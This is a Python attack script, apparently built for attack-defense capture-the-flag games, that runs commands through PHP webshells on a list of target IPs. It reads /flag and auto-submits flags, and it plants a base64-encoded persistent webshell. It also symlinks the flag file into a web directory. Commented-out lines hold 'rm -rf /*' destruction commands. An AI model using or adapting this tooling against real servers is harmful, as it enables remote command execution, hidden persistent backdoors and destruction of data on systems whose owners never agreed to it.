from util import md5,submit_flag,g_ip,FLAG_FORMAT,log
from undead import generate_undead_shell
import requests as req
import os
from urllib.parse import quote
import re
import sys
import warnings
warnings.filterwarnings('ignore')

def exp1_post(ip,cmd="cat /flag"):
	url=f"http://{ip}/index.php" #shell的值
	data={
	'code':f"system('{cmd}');",
	}
	try:
		res=req.post(url,data,timeout=3).text
		if re.match(FLAG_FORMAT,res):
			print(f"[*] GET_FLAG: {ip} {res}")
			return res
		else:
			return False
	except Exception as e:
		pass


def exp2_get(ip,cmd):
	url=f"http://{ip}/user/noname.php" #shell的值
	data={
	'cmd':'''dwadwad'''
	}
	try:
		res=req.post(url,data,timeout=3).text 
		if re.match(FLAG_FORMAT,res):
			print(f"[*] GET_FLAG {ip} {res}")
			return res 
		else:
			print(res)
			return False
	except Exception as e:
		pass
		
def exp3_get(ip,cmd=""):
	url=f"http://{ip}/index.php?cmd=system('"+ quote(cmd) + "');"
	try:
		res=req.get(url,timeout=3).text
		if re.match(FLAG_FORMAT,res):
			return res
		else:
			return False
	except Exception as e:
		pass




def do_undead_shell(ip):
	'''================== 配置区 =================='''
	undead_path='/var/www/html/static/undead.php' # 不死马的路径
	'''==========================================='''

	# 不死马的内容 base64加密
	undead_shell_content=generate_undead_shell(ip)
	# 执行命令生成不死马
	g_undead_cmd=f"echo {undead_shell_content} | base64 -d > {undead_path}"

	# 用php代码生成不死马
	g_undead_code=f"file_put_contents('{undead_path}',base64_decode('{undead_shell_content}'))"

	# 利用webshell写入不死马
	exp1_post(ip,g_undead_cmd)
	# exp1_post(ip,g_undead_code)

	#exp1_get(ip,'rm -rf /var/www/html/*')
	#exp1_get(ip,'rm -rf /*')

	#触发不死马
	try:
		req.get(url=f"http://{ip}/"+undead_path.replace('/var/www/html',''),timeout=3).text
	except Exception as e:
		pass

	# 不死马是否被写入
	try:
		test_undead_dir=f"http://{ip}"+"/static/" # 可写目录
		for i in range(1,5):
			test_undead_url=test_undead_dir+"."+md5(f"shell{ip}_{i}")+".php"
			if req.get(url=test_undead_url,timeout=3).status_code==200:
				print(f"[*] 不死马存在:",test_undead_url)
				log(test_undead_url,'undead.txt')
				break
			else:
				print(f"[!] 不死马不存在,请检查",test_undead_url)
				break
	except Exception as e:
		pass

def do_link(ip):
	'''================== 配置区 =================='''
	link_path='/var/www/html/static/.style.css' # 写入软连接的路径
	'''==========================================='''

	# 执行命令生成软连接
	g_link_cmd=f"ln -s /flag {link_path}"
	# php代码生成软连接
	g_link_code=f"`ln -s /flag {link_path}`;"


	#利用webshell写入软连接
	exp1_post(ip,g_link_cmd)
	


	# 写入文件
	link_url=f"http://{ip}"+link_path.replace('/var/www/html','')
	try:
		r=req.get(url=link_url,timeout=3)
		if re.match(FLAG_FORMAT,r.text):
			print("[*] 软连接存在,flag正常",link_url)
			log(link_url,'links.txt')
		else:
			print("[-] 软连接不存在,flag失败",link_url)

	except Exception as e:
		pass

'''===========主入口==========='''

if __name__=='__main__':
	ips=g_ip()
	def run_attack(func):
		for ip in ips:
			exec(f"submit_flag({func}('{ip}'),'{ip}')")
			# do_undead_shell(ip)  
			# do_link(ip)

	# 执行poc
	run_attack('exp1_post')

	
	# if len(sys.argv)>1:
	# 	run_attack(sys.argv[1])









